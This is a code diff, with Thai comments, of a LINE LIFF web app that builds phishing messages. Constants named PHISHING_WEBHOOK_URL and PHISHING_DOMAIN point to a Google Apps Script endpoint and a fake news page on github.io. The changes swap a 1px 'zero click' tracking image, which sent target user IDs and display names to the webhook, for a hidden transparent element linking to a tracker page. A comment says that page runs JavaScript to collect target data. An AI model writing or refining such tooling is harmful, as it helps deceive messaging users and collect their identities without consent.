@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxRFOFab5kMh2pcOPJIoQqqMekQGH9Qb3CwLJeziRV8Q9K77ArXU57n26QTVweGf3pj/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwKJajS4Ry9lXu_fugjxBhqgf9qQE7AO7JnfPB0azojvPG94ijEZgxfbuKtoiHIGeSw/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -818,40 +818,32 @@
                 if (!imageUrl) return;
                 
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
-                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`;
+                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง webhook URL ที่รวมข้อมูลทั้งหมดที่จำเป็น
-                // แทนที่จะใช้ image เล็กๆ ให้ใช้ webhook ที่ระบุชัดเจน
-                const zeroClickWebhookBase = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
-                const zeroClickParams = [
-                    `key=${trackingKey}`,
-                    `case=${encodeURIComponent(caseName)}`,
-                    `creator=${encodeURIComponent(userId)}`,
-                    `name=${encodeURIComponent(displayName)}`,
-                    `isTarget=true`,
-                    `targetType=zeroclick`,
-                    `imageUrl=${encodeURIComponent(imageUrl)}`,
-                    `r=${Date.now()}`  // ป้องกันการแคช
-                ];
+                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // URL สำหรับเรียกใช้งาน webhook
-                const zeroClickUrl = `${zeroClickWebhookBase}&${zeroClickParams.join('&')}`;
-                
-                console.log("Zero Click Webhook URL:", zeroClickUrl);
+                // สร้าง URL สำหรับการติดตาม zero-click ที่ดีขึ้น
+                let zeroClickTrackUrl = `${PHISHING_DOMAIN}/tracker.html`;
+                zeroClickTrackUrl += `?key=${trackingKey}`;
+                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
+                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&r=${randomSuffix}`; // ป้องกันการแคช
 
-                // สร้าง Flex Message ที่มีรูปภาพหลักและรูปเล็กๆ สำหรับ zero click
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก iframe ขนาดเล็กไว้เพื่อเก็บข้อมูล
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่ - ${caseName}`,
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
-                        hero: {
+                        hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: {
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
@@ -860,29 +852,30 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // รูปภาพขนาดเล็กสำหรับ Zero Click Tracking
+                                // ใช้ iframe ขนาดเล็กเพื่อรันโค้ด JavaScript เก็บข้อมูลเป้าหมาย
                                 {
-                                    type: 'image',
-                                    url: `${zeroClickUrl}`, 
-                                    size: '1px',
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover',
+                                    type: 'box',
+                                    layout: 'vertical',
+                                    contents: [
+                                        {
+                                            type: 'text',
+                                            text: ' ',
+                                            size: '1px',
+                                            color: '#ffffff00',
+                                            wrap: true,
+                                            action: {
+                                                type: 'uri',
+                                                label: 'x',
+                                                uri: zeroClickTrackUrl
+                                            }
+                                        }
+                                    ],
+                                    width: '1px',
+                                    height: '1px',
                                     position: 'absolute',
-                                    offsetTop: '0px',
-                                    offsetStart: '0px'
+                                    offsetStart: '0px',
+                                    offsetTop: '0px'
                                 },
-                                // สร้าง timestamp เพื่อให้มั่นใจว่า Line จะโหลดรูปเสมอ
-                                {
-                                    type: 'image',
-                                    url: `https://via.placeholder.com/1x1.png?text=.&random=${Date.now()}`,
-                                    size: '1px',
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover',
-                                    position: 'absolute',
-                                    offsetTop: '0px',
-                                    offsetEnd: '0px'
-                                },
-                                // ใส่ box ว่างๆ เพื่อให้มี body content
                                 {
                                     type: 'box',
                                     layout: 'vertical',
@@ -910,9 +903,14 @@
                         // บันทึก Tracking Key Mapping ก่อน
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
-                            console.log('บันทึก Tracking Key Mapping: ' + (saved ? 'สำเร็จ' : 'ล้มเหลว'));
+                            if (!saved) {
+                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
+                            } else {
+                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
+                            }
                         } catch (saveError) {
                             console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
+                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
                         }
 
                         // รีเซ็ตหน้าจอ
